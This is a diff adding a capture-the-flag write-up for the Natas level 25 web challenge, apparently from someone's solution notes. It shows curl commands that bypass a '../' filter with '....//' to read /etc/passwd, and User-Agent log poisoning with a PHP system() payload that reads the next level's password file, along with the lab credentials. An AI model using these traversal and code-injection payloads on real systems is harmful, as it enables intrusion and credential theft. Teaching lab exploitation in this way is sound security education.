@@ -2506,9 +2506,353 @@ And the password for natas25 is `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`.
 Validate types and use `hash_equals()` for safe comparisons.
 
 ### Level 25
-- **Date**: 2026-04-20
+- **Date**: 2026-04-21
 - **URL**: `http://natas25.natas.labs.overthewire.org`
 - **Password**: `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
+- **Tools**: Web Browser, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+```php
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en");
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+
+        closedir($handle);
+        return $listoffiles;
+    }
+
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php
+    session_start();
+    setLanguage();
+
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+```
+
+Notice the `safeinclude()` function that is used to include the language files.
+
+`strstr($filename,"../")` checks if the filename contains `../` and removes it if it does.
+
+But if we use `....//` instead of `../`, we can bypass this check and perform **directory traversal** anyway!
+
+Let's try to read `/etc/passwd` which is always present on Linux systems (which Natas uses) and contains user information:
+```powershell
+curl.exe -i -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" "http://natas25.natas.labs.overthewire.org/?lang=....//etc/passwd"
+```
+
+No dice!
+
+Try adding `....//` multiple times until we get the contents of `/etc/passwd`!
+```powershell
+curl.exe -i -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd"
+```
+
+And it turns out that we need **5** `....//` to get to the **root directory** and read `/etc/passwd`!
+
+Output:
+```html
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+Notice `$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");` in `logRequest()`.
+This means that the log file is named `natas25_<session_id>.log` and is stored in `/var/www/natas/natas25/logs/`.
+
+So we also need the **session ID** to read the log file.
+
+Perhaps we should use a **cookie jar** to store the session cookie so that we stay in the same session across all curl requests.
+
+First run:
+```powershell
+curl.exe -i -c cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" "http://natas25.natas.labs.overthewire.org/"
+```
+
+Get the session ID from cookies.txt (or from the output of the curl request):
+```text
+PHPSESSID	5ighrbmvo9b5rhr1pjl9ve3qt5
+```
+
+Then try:
+```powershell
+curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
+```
+
+Output:
+```html
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+[21.04.2026 21::53:57] curl/8.18.0 "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+<div align="right"><h6></h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+That's the log file! We have successfully read the log file using directory traversal!
+
+But we want to get the password from `/etc/natas_webpass/natas26` which is also on the server.
+
+Notice `$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];` in `logRequest()`.
+This means that the `User-Agent` header is logged in the log file.
+
+We can use this to **poison** the log file by injecting PHP code into the `User-Agent` header, like `<?php system('cat /etc/natas_webpass/natas26'); ?>`.
+
+Let's try this:
+```powershell
+curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
+"http://natas25.natas.labs.overthewire.org"
+```
+
+And read the log file again with:
+```powershell
+curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
+```
+
+Output:
+```html
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+[21.04.2026 21::53:57] curl/8.18.0 "Directory traversal attempt! fixing request."
+[21.04.2026 21::57:48] curl/8.18.0 "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+<div align="right"><h6></h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+But the log file does not contain the output of our injected PHP code!
+
+It took me hours to figure this out, until finally, with the help of Gemini, we did.
+
+Notice that the previous command to **poison** the log file had **no** `lang` parameter!
+```powershell
+curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
+"http://natas25.natas.labs.overthewire.org"
+```
+
+Remember this part of the source code:
+```php
+function setLanguage(){
+    /* language setup */
+    if(array_key_exists("lang",$_REQUEST))
+        if(safeinclude("language/" . $_REQUEST["lang"] ))
+            return 1;
+    safeinclude("language/en");
+}
+
+function safeinclude($filename){
+    // check for directory traversal
+    if(strstr($filename,"../")){
+        logRequest("Directory traversal attempt! fixing request.");
+        $filename=str_replace("../","",$filename);
+    }
+    // dont let ppl steal our passwords
+    if(strstr($filename,"natas_webpass")){
+        logRequest("Illegal file access detected! Aborting!");
+        exit(-1);
+    }
+    // add more checks...
+
+    if (file_exists($filename)) {
+        include($filename);
+        return 1;
+    }
+    return 0;
+}
+```
+
+Look carefully.
+
+What happens when `lang` is **not** present in the URL query parameters?
+
+- `setLanguage()` is called.
+- `array_key_exists("lang",$_REQUEST)` returns `false`.
+- `safeinclude("language/" . $_REQUEST["lang"] )` is **not** executed.
+- `safeinclude("language/en")` is called instead.
+- `safeinclude()` checks whether the filename string `language/en` contains `../` or `natas_webpass`, which it does not.
+- `logRequest()` is **not** called!
+
+So we resend the request with a **dummy** `lang` parameter so safeinclude() uses user input.
+```powershell
+curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
+"http://natas25.natas.labs.overthewire.org/?lang=....//sample"
+```
+
+And read the log file again with:
+```powershell
+curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
+"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
+```
+
+Output:
+```html
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+[21.04.2026 22::11:20] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+ "Directory traversal attempt! fixing request."
+[21.04.2026 22::11:25] curl/8.18.0 "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+<div align="right"><h6></h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+And the password for natas26 is `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`!
+
+And at last we have the credentials for natas26!
+
+#### The Lesson
+
+Don’t rely on string filtering to secure file inclusion—it’s trivial to bypass.
+
+### Level 26
+- **Date**: 2026-04-22
+- **URL**: `http://natas26.natas.labs.overthewire.org`
+- **Password**: `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
 - **Tools**: Web Browser
 
 #### The Solution
